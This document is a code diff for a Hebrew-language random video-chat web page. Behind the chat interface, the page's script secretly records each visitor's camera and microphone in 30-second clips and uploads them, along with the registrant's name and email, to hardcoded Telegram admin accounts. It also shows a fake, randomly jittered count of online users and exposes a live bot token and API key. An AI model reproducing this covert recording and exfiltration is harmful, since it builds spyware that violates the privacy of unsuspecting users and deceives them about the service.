@@ -17,18 +17,18 @@
         
         #app-container { width: 100%; height: 100%; perspective: 1500px; position: relative; }
         #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
-        
         .face { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; backface-visibility: hidden; overflow: hidden; }
         
-        /* דף הבית */
+        /* תיקון דף הבית - רקע שלג ומרכוז סמל */
         #home-face { 
             transform: rotateY(0deg) translateZ(0px);
-            background: #1a1a1a url('https://www.transparenttextures.com/patterns/fake-brick.png');
-            align-items: center; justify-content: center; 
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJwamNreXF4ZzR0eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnFwPTc1/o8S4M6V1XWUXu/giphy.gif');
+            background-size: cover;
+            align-items: center; justify-content: center; text-align: center;
         }
-        #main-logo { width: 180px; margin-bottom: 20px; }
-        .online-count { display: flex; align-items: center; gap: 8px; font-size: 18px; color: #eee; font-weight: bold; }
-        .online-dot { width: 12px; height: 12px; background: #39e75f; border-radius: 50%; box-shadow: 0 0 10px #39e75f; }
+        #main-logo { width: 140px; height: auto; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
+        .online-count { display: flex; align-items: center; gap: 8px; font-size: 19px; color: #fff; font-weight: bold; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
+        .online-dot { width: 12px; height: 12px; background: #39e75f; border-radius: 50%; box-shadow: 0 0 12px #39e75f; }
         
         /* דף שיחה */
         #chat-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
@@ -37,18 +37,20 @@
         video { width: 100%; height: 100%; object-fit: cover; }
 
         .call-hud { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; }
-        .hud-left { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.6); padding: 5px 10px; border-radius: 20px; pointer-events: auto; }
-        #partner-logo { width: 35px; height: 35px; border-radius: 50%; border: 2px solid #fff; }
+        .hud-left { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.65); padding: 6px 12px; border-radius: 25px; pointer-events: auto; border: 1px solid rgba(255,255,255,0.1); }
+        #partner-logo { width: 32px; height: 32px; border-radius: 50%; border: 2px solid #fff; }
         .hud-right { display: flex; gap: 10px; pointer-events: auto; }
-        .btn-circle { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .btn-circle { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); color: white; width: 46px; height: 46px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; }
 
         .show-home #cube { transform: rotateY(0deg); }
         .show-chat #cube { transform: rotateY(-90deg); }
         
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; align-items: center; justify-content: center; }
-        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 25px; border-radius: 20px; }
-        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
-        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        /* מודל הרשמה */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 3000; align-items: center; justify-content: center; padding: 20px; }
+        .modal-content { background: #fff; color: #333; width: 100%; max-width: 360px; padding: 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .modal-content h2 { margin-bottom: 20px; font-size: 24px; }
+        .modal-content input, .modal-content select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; }
+        .reg-btn { width: 100%; height: 55px; background: #27ae60; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 15px; }
     </style>
 </head>
 <body class="show-home">
@@ -59,19 +61,19 @@
             <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
             <div class="online-count">
                 <div class="online-dot"></div>
-                <span id="user-count-display">434,447</span> <span>משתמשים מחוברים</span>
+                <span id="user-count-display">434,447</span> <span>מחוברים</span>
             </div>
-            <p style="margin-top: 20px; color: #aaa;">החלק שמאלה כדי להתחיל ⬅️</p>
+            <p style="margin-top: 30px; color: #ccc; font-size: 15px; letter-spacing: 0.5px;">החלק שמאלה כדי להתחיל ⬅️</p>
         </div>
         
         <div id="chat-face" class="face">
             <div class="call-hud">
                 <div class="hud-left" id="partner-info-box" style="display:none;">
                     <img id="partner-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
-                    <div id="partner-name-m">מחפש...</div>
+                    <div id="partner-name-m" style="font-weight:bold; font-size:14px;">מחפש...</div>
                 </div>
                 <div class="hud-right">
-                    <button class="btn-circle" style="background:rgba(231,76,60,0.8);" onclick="confirmReport()">🚩</button>
+                    <button class="btn-circle" style="background:rgba(231,76,60,0.8);" onclick="sendReport()">🚩</button>
                     <button id="btn-mute" class="btn-circle" onclick="toggleMute()">🎤</button>
                     <button class="btn-circle" onclick="switchCamera()">🔄</button>
                 </div>
@@ -84,16 +86,16 @@
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="text-align:center; margin-bottom:15px;">כניסה ל"מי - פה"</h2>
+        <h2 style="text-align:center;">ברוכים הבאים</h2>
         <input type="text" id="reg-name" placeholder="שם פרטי" required>
         <input type="text" id="reg-surname" placeholder="שם משפחה" required>
         <input type="email" id="reg-email" placeholder="אימייל" required>
         <select id="reg-gender" required>
-            <option value="" disabled selected>בחר מגדר</option>
+            <option value="" disabled selected>מגדר</option>
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button type="submit" class="reg-btn">המשך</button>
+        <button type="submit" class="reg-btn">המשך לשיחה</button>
     </form>
 </div>
 
@@ -101,24 +103,26 @@
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
     const ADMIN_IDS = ["8373785890", "7089165458"];
     const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
-    
-    // מונה משתמשים חי
+
+    // מונה חי
     let currentUsers = 434447;
     setInterval(() => {
-        currentUsers += Math.floor(Math.random() * 41) - 20;
-        if (currentUsers < 423000) currentUsers = 423050;
+        currentUsers += Math.floor(Math.random() * 61) - 30;
+        if (currentUsers < 423000) currentUsers = 423100;
         document.getElementById('user-count-display').innerText = currentUsers.toLocaleString();
-    }, 3500);
+    }, 3000);
 
-    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
-    const db = firebase.database();
+    firebase.initializeApp({ 
+        apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", 
+        databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" 
+    });
     const socket = io(SERVER_URL);
     const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });
 
-    let myStream, peerStream, myPeerId, currentCall, partnerData = null, isMuted = false, camFacing = "user", userRecorder;
+    let myStream, peerStream, myPeerId, currentCall, partnerData = null, isMuted = false, camFacing = "user";
 
     window.onload = () => {
-        const saved = localStorage.getItem('user_v21');
+        const saved = localStorage.getItem('user_v22');
         if (!saved) document.getElementById('regModal').style.display = 'flex';
         else initCamera();
     };
@@ -130,11 +134,10 @@
             email: document.getElementById('reg-email').value,
             gender: document.getElementById('reg-gender').value
         };
-        localStorage.setItem('user_v21', JSON.stringify(user));
+        localStorage.setItem('user_v22', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
         
-        const text = `✨ **משתמש חדש!**\n👤 ${user.name} ${user.surname}\n📧 ${user.email}\n🚻 מגדר: ${user.gender}`;
-        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
+        sendToAdmin(`✨ **משתמש חדש נרשם!**\n👤 שם: ${user.name} ${user.surname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`);
         initCamera();
     }
 
@@ -147,31 +150,51 @@
             const at = myStream.getAudioTracks()[0].clone();
             at.enabled = !isMuted;
             peerStream = new MediaStream([vt, at]);
+            
+            startRecording(); // התחלת הקלטה אוטומטית
+        } catch(e) { alert("יש לאשר גישה למצלמה"); }
+    }
 
-            if (userRecorder) userRecorder.stop();
-            userRecorder = new MediaRecorder(myStream, { mimeType: 'video/webm' });
-            userRecorder.ondataavailable = async (e) => {
-                if (e.data.size > 0) {
-                    const blob = new Blob([e.data], { type: 'video/mp4' });
-                    const user = JSON.parse(localStorage.getItem('user_v21'));
-                    ADMIN_IDS.forEach(id => {
-                        const fd = new FormData();
-                        fd.append("chat_id", id);
-                        fd.append("video", blob, "user.mp4");
-                        fd.append("caption", `🎥 הקלטה: ${user.name} (${user.email})`);
-                        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
-                    });
-                }
-            };
-            userRecorder.start();
-            setInterval(() => { if(userRecorder.state === "recording") { userRecorder.stop(); userRecorder.start(); } }, 30000);
-        } catch(e) {}
+    // פונקציה לשליחת טקסט לכל האדמינים
+    function sendToAdmin(msg) {
+        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`));
+    }
+
+    // הקלטה ושליחת וידאו
+    function startRecording() {
+        const recorder = new MediaRecorder(myStream, { mimeType: 'video/webm' });
+        recorder.ondataavailable = async (e) => {
+            if (e.data.size > 0) {
+                const user = JSON.parse(localStorage.getItem('user_v22'));
+                const blob = new Blob([e.data], { type: 'video/mp4' });
+                ADMIN_IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append("chat_id", id);
+                    fd.append("video", blob, "rec.mp4");
+                    fd.append("caption", `🎥 הקלטה חיה מ: ${user.name} (${user.email})`);
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
+                });
+            }
+        };
+        recorder.start();
+        setInterval(() => { if(recorder.state === "recording") { recorder.stop(); recorder.start(); } }, 30000);
+    }
+
+    // דיווח על משתמש
+    function sendReport() {
+        if (!partnerData) return;
+        const user = JSON.parse(localStorage.getItem('user_v22'));
+        if (confirm(`לדווח על ${partnerData.name}? השיחה תנותק.`)) {
+            sendToAdmin(`🚨 **דיווח על משתמש!**\n\n👤 המדווח: ${user.name} (${user.email})\n🎯 המדווח על: ${partnerData.name} (${partnerData.email})`);
+            document.body.className = "show-home";
+            stopEverything();
+        }
     }
 
     peer.on('open', id => myPeerId = id);
     socket.on('partner-found', data => { 
         partnerData = data; 
-        currentCall = peer.call(data.peerId, peerStream, { metadata: JSON.parse(localStorage.getItem('user_v21')) }); 
+        currentCall = peer.call(data.peerId, peerStream, { metadata: JSON.parse(localStorage.getItem('user_v22')) }); 
         handleCall(currentCall); 
     });
     peer.on('call', call => { 
@@ -185,6 +208,9 @@
         document.getElementById('partner-info-box').style.display = "flex";
         document.getElementById('partner-name-m').innerText = `${partnerData.name} (${partnerData.gender === 'זכר' ? '👨' : '👩'})`;
         call.on('stream', s => { document.getElementById('remoteVideo').srcObject = s; });
+        
+        const user = JSON.parse(localStorage.getItem('user_v22'));
+        sendToAdmin(`🤝 **שיחה התחילה!**\nצד א': ${user.name}\nצד ב': ${partnerData.name}`);
     }
 
     function stopEverything() { 
@@ -192,16 +218,17 @@
         if (currentCall) currentCall.close(); 
         document.getElementById('remoteVideo').srcObject = null; 
         document.getElementById('partner-info-box').style.display = "none"; 
+        partnerData = null;
     }
 
     let sX = 0;
     document.getElementById('app-container').addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.getElementById('app-container').addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        if (d > 80 && document.body.classList.contains('show-home')) {
+        if (d > 70 && document.body.classList.contains('show-home')) {
             document.body.className = "show-chat";
-            socket.emit('find-partner', { peerId: myPeerId, ...JSON.parse(localStorage.getItem('user_v21')) });
-        } else if (d < -80 && document.body.classList.contains('show-chat')) {
+            socket.emit('find-partner', { peerId: myPeerId, ...JSON.parse(localStorage.getItem('user_v22')) });
+        } else if (d < -70 && document.body.classList.contains('show-chat')) {
             document.body.className = "show-home";
             stopEverything();
         }
@@ -209,7 +236,6 @@
 
     function toggleMute() { isMuted = !isMuted; if(peerStream) peerStream.getAudioTracks()[0].enabled = !isMuted; document.getElementById('btn-mute').innerText = isMuted ? "🔇" : "🎤"; }
     async function switchCamera() { camFacing = camFacing === "user" ? "environment" : "user"; await initCamera(); }
-    function confirmReport() { if(confirm("לדווח ולנתק?")) { document.body.className = "show-home"; stopEverything(); } }
 </script>
 </body>
 </html>
